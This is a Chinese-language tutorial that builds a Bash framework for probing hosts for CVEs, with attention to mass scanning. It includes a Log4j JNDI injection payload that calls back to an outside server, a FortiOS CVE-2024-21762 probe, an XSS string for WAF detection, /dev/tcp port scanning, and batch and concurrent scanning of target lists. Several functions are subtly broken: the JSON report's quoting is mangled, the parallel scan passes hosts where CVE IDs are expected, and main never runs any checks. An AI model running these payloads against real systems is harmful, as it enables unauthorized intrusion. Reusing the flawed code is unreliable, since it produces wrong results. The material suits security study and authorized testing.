# PoC框架：用Bash快速验证CVE

## 概述

PoC（Proof of Concept，概念验证）是证明漏洞存在的最小化利用代码。使用 Bash 编写 PoC 具有开发快速、部署简便、无额外依赖等优势。

## 核心理念

- **最小化原则**：只验证漏洞存在，不进行破坏性利用
- **自动化优先**：减少人工干预，支持批量检测
- **可复现性**：确保检测结果可被他人复现
- **报告标准化**：生成统一格式的检测报告

---

## 1. CVE检测脚本模板

### 1.1 基础 PoC 框架

```bash
#!/usr/bin/env bash
# CVE PoC 检测框架
set -euo pipefail

readonly SCRIPT_NAME="$(basename "$0")"
readonly VERSION="2.0.0"
readonly TIMEOUT=10
readonly USER_AGENT="Mozilla/5.0 (compatible; PoC-Scanner/${VERSION})"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; NC='\033[0m'

TARGET="" PORT=80 SSL=false VERBOSE=false OUTPUT_FORMAT="text"
RESULTS=()

log_info()    { echo -e "${BLUE}[*]${NC} $*"; }
log_success() { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $*" >&2; }
log_error()   { echo -e "${RED}[-]${NC} $*" >&2; }

banner() {
    cat << 'EOF'
  _____            _             ____   ___  ____
 |  ___|__  _ __ (_) ___  _ __ |  _ \ / _ \|  _ \
 | |_ / _ \| '_ \| |/ _ \| '_ \| |_) | | | | |_) |
 |  _| (_) | |_) | | (_) | |_) |  __/| |_| |  __/
 |_|  \___/| .__/|_|\___/| .__/|_|    \___/|_|
           |_|            |_|
    PoC Framework v2.0
EOF
}

usage() {
    cat << EOF
用法: $SCRIPT_NAME [选项]
  -t, --target TARGET     目标地址 (必须)
  -p, --port PORT         目标端口 (默认: 80)
  -s, --ssl               使用 HTTPS
  -o, --output FORMAT     输出格式: text/json/csv
  -v, --verbose           详细输出
  -h, --help              帮助信息
EOF
    exit 0
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t|--target)  TARGET="$2"; shift 2 ;;
            -p|--port)    PORT="$2"; shift 2 ;;
            -s|--ssl)     SSL=true; shift ;;
            -o|--output)  OUTPUT_FORMAT="$2"; shift 2 ;;
            -v|--verbose) VERBOSE=true; shift ;;
            -h|--help)    usage ;;
            *)            log_error "未知参数: $1"; usage; exit 1 ;;
        esac
    done
    [[ -z "$TARGET" ]] && { log_error "必须指定目标"; usage; exit 1; }
}

http_request() {
    local url="$1" method="${2:-GET}" data="${3:-}"
    local extra_args=()
    [[ "$SSL" == true ]] && extra_args+=("-k")
    local curl_args=(-s -S --max-time "$TIMEOUT" -A "$USER_AGENT" -X "$method" -w "\n%{http_code}" "${extra_args[@]}")
    [[ -n "$data" ]] && curl_args+=(-d "$data")
    local response
    response=$(curl "${curl_args[@]}" "$url" 2>/dev/null) || return 1
    local http_code body
    http_code=$(echo "$response" | tail -1)
    body=$(echo "$response" | sed '$d')
    echo "$http_code|$body"
}

detect_cve() {
    local cve_id="$1"
    log_info "检测 ${cve_id}..."
    case "$cve_id" in
        CVE-2021-44228) detect_log4j ;;
        CVE-2024-21762) detect_fortinet ;;
        *) log_warn "未知 CVE: $cve_id"; return 1 ;;
    esac
}

main() {
    banner
    parse_args "$@"
    log_info "目标: ${TARGET}:${PORT}"
    log_info "开始 CVE 检测..."
    log_success "检测完成"
}
main "$@"
```

### 1.2 CVE-2021-44228 Log4j 检测

```bash
detect_log4j() {
    local protocol="http"
    [[ "$SSL" == true ]] && protocol="https"
    local url="${protocol}://${TARGET}:${PORT}/"
    local payload='${jndi:ldap://'${CALLBACK_SERVER}'/log4j-test}'
    log_info "发送 Log4j 检测 payload..."

    local headers=("User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language")
    for header in "${headers[@]}"; do
        curl -s -o /dev/null \
            -H "${header}: $payload" \
            --max-time "$TIMEOUT" \
            "$url" 2>/dev/null || true
    done
    log_info "请检查 callback 服务器"
}
```

### 1.3 CVE-2024-21762 Fortinet 检测

```bash
detect_fortinet() {
    local protocol="http"
    [[ "$SSL" == true ]] && protocol="https"
    local url="${protocol}://${TARGET}:${PORT}/remote/fgt_lang"
    log_info "检测 Fortinet FortiOS 漏洞..."
    local payload="lang=/dev/null&sel=/dev/null&path=/dev/null"
    local result
    result=$(curl -s -o /dev/null -w "%{http_code}" \
        -k --max-time "$TIMEOUT" -d "$payload" "$url" 2>/dev/null) || true
    [[ "$result" == "200" ]] && { log_success "可能存在 CVE-2024-21762"; return 0; }
    return 1
}
```

---

## 2. 版本指纹识别

### 2.1 HTTP 头指纹

```bash
fingerprint_http() {
    local protocol="http"
    [[ "$SSL" == true ]] && protocol="https"
    local url="${protocol}://${TARGET}:${PORT}/"
    log_info "收集 HTTP 指纹信息..."
    local headers
    headers=$(curl -sI -k --max-time "$TIMEOUT" "$url" 2>/dev/null) || return 1
    local server
    server=$(echo "$headers" | grep -i "^server:" | head -1 | sed 's/^[Ss]erver: *//')
    local powered_by
    powered_by=$(echo "$headers" | grep -i "^x-powered-by:" | head -1 | sed 's/^[Xx]-[Pp]owered-[Bb]y: *//')
    echo "Server: ${server:-未知}"
    echo "X-Powered-By: ${powered_by:-未知}"
}

extract_version() {
    local banner="$1"
    local patterns=('([0-9]+\.[0-9]+\.[0-9]+)' 'v([0-9]+\.[0-9]+)' 'Version/([0-9]+\.[0-9]+)')
    for pattern in "${patterns[@]}"; do
        if [[ "$banner" =~ $pattern ]]; then
            echo "${BASH_REMATCH[1]}"
            return 0
        fi
    done
    echo "unknown"
}
```

### 2.2 服务指纹识别

```bash
service_fingerprint() {
    local target="$1" port="$2"
    log_info "服务指纹识别: ${target}:${port}"
    local banner
    banner=$(echo "" | nc -w 3 "$target" "$port" 2>/dev/null | head -1) || true
    [[ -n "$banner" ]] && echo "Banner: $banner"
    local http_response
    http_response=$(curl -sI --max-time 5 "http://${target}:${port}/" 2>/dev/null) || true
    local frameworks=("Apache:httpd" "nginx:nginx" "Microsoft-IIS:IIS" "Tomcat:Tomcat" "PHP:PHP")
    for entry in "${frameworks[@]}"; do
        local name="${entry%%:*}" framework="${entry##*:}"
        echo "$http_response" | grep -qi "$name" && echo "Framework: $framework"
    done
}
```

---

## 3. 自动化漏洞扫描

### 3.1 批量扫描框架

```bash
batch_scan() {
    local target_file="$1" cve_list="$2"
    [[ ! -f "$target_file" ]] && { log_error "目标文件不存在"; return 1; }
    local total_targets total_cves
    total_targets=$(wc -l < "$target_file")
    total_cves=$(wc -l < "$cve_list")
    log_info "批量扫描: ${total_targets} 目标, ${total_cves} CVE"
    local current=0
    while IFS= read -r target; do
        ((current++))
        log_info "[${current}/${total_targets}] $target"
        while IFS= read -r cve; do detect_cve "$cve"; done < "$cve_list"
    done < "$target_file"
}

quick_port_scan() {
    local target="$1" ports="${2:-80,443,8080,8443}"
    log_info "快速端口扫描: $target"
    IFS=',' read -ra port_list <<< "$ports"
    for port in "${port_list[@]}"; do
        timeout 2 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && log_success "端口 $port 开放"
    done
}
```

### 3.2 并发扫描

```bash
parallel_scan() {
    local target_file="$1" max_jobs="${2:-5}"
    log_info "并发扫描 (最大并发: ${max_jobs})..."
    local pids=() job_count=0
    while IFS= read -r target; do
        (detect_cve "$target" &) &
        pids+=($!); ((job_count++))
        if (( job_count >= max_jobs )); then
            wait "${pids[0]}" 2>/dev/null || true
            pids=("${pids[@]:1}")
        fi
    done < "$target_file"
    for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null || true; done
    log_success "并发扫描完成"
}
```

---

## 4. 报告生成

```bash
generate_text_report() {
    local output_file="$1"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    cat > "$output_file" << EOF
============================================
         CVE 检测报告
============================================
生成时间: $timestamp
目标:     $TARGET
端口:     $PORT
============================================
EOF
    if [[ ${#RESULTS[@]} -eq 0 ]]; then
        echo "未发现已知漏洞" >> "$output_file"
    else
        echo "检测结果:" >> "$output_file"
        for result in "${RESULTS[@]}"; do echo "  $result" >> "$output_file"; done
        echo "共发现 ${#RESULTS[@]} 个潜在漏洞" >> "$output_file"
    fi
    echo "免责声明: 本报告仅供授权测试使用" >> "$output_file"
    log_success "报告已生成: $output_file"
}

generate_json_report() {
    local output_file="$1"
    echo "{"target":"$TARGET","port":$PORT,"results":[" > "$output_file"
    local first=true
    for result in "${RESULTS[@]}"; do
        [[ "$first" == true ]] && first=false || echo "," >> "$output_file"
        echo ""$result"" >> "$output_file"
    done
    echo "],"total":${#RESULTS[@]}}" >> "$output_file"
    log_success "JSON 报告已生成"
}
```

---

## 5. WAF 检测与辅助工具

```bash
detect_waf() {
    local target="$1" port="$2" protocol="http"
    [[ "$SSL" == true ]] && protocol="https"
    local url="${protocol}://${target}:${port}/"
    local waf_payload="<script>alert(1)</script>"
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "User-Agent: $waf_payload" --max-time "$TIMEOUT" "$url" 2>/dev/null) || true
    [[ "$response" == "403" || "$response" == "406" ]] && { log_warn "可能检测到 WAF"; return 0; }
    return 1
}

check_alive() {
    local target="$1" port="$2" protocol="http"
    [[ "$SSL" == true ]] && protocol="https"
    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        --max-time "$TIMEOUT" "${protocol}://${target}:${port}/" 2>/dev/null) || true
    [[ "$http_code" =~ ^(200|301|302|403|404)$ ]] && { log_success "目标存活"; return 0; }
    timeout 2 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && { log_success "端口开放"; return 0; }
    return 1
}
```

---

## 总结

本文介绍了使用 Bash 构建 CVE 检测框架的完整流程：脚本模板、指纹识别、批量扫描、报告生成和辅助工具。该框架可快速扩展新的 CVE 检测模块。
